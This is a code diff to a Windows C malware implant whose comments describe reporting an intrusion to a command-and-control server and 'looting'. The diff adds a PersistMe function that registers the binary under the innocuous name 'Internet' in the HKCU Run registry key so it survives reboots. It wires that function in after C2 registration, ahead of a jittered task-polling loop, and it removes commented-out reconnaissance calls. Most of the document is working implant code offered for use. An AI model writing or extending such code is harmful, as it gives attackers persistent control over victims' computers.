@@ -258,12 +258,23 @@ wchar_t* GetTasks(){
     WinHttpCloseHandle(session);
 }
 
+void PersistMe(){
+    HKEY key;
+    RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &key);
+    wchar_t* buffer = (wchar_t*)malloc(256);
+    GetModuleFileNameW(NULL, buffer, 256);
+    BYTE* input = (BYTE*)buffer;
+    DWORD size = wcslen(buffer) * sizeof(buffer[0]);
+    RegSetValueExW(key, L"Internet", 0, REG_SZ, input, size);
+    RegCloseKey(key);
+}
+
 int _tmain(int argc, _TCHAR *argv[]){
 
     if(argc == 1){
         // Report intrusion to C2
         RegisterC2();
-        
+        PersistMe();
         // Periodically check for new commands from C2
         while(1){
             wchar_t* tasks = GetTasks();
@@ -273,19 +284,6 @@ int _tmain(int argc, _TCHAR *argv[]){
             Sleep(30000+jitter);
         }
     }
-
-    // Do malware things (investigation, looting, persistence)
-
-    // Situational Awareness tasks
-    //RunningProcesses();
-    //ls(".");
-    //wchar_t* productID = ProductID();
-    //printf("%s\n", productID);
-    //ComputerName();
-    //CurrentUser();
-    //OSVersion();
-    //NetworkInterfaces();
-
 
     /*
 
